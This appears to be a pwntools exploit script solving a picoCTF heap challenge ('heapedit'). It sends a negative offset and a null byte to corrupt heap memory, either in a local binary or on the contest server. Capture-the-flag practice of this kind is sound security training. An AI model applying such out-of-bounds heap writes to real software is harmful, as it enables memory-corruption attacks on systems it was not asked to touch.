#!/usr/bin/env python3

from pwn import *

URL = 'mercury.picoctf.net'
PORT = 34499


def local_attack():
    p = process('./heapedit_patched')
    if args.GDB:
        gdb.attach(p)
    
    p.sendline('-5144') # sendlineafter('Address:')
    p.sendline(b'\x00') # sendlineafter('Value:')

    p.interactive()

def remote_attack():
    conn = remote(URL,PORT)
    print(conn.recvline())
    print(conn.recvuntil(' ', drop=True))
    print('Trying to send')
    conn.send('-5144'.encode('utf-8') + b'\n')
    print(conn.recvuntil(' ', drop=True))
    conn.send(b'\x00\n')
    print(conn.recvline())


def main():
    remote_attack()


if __name__ == "__main__":
    main()

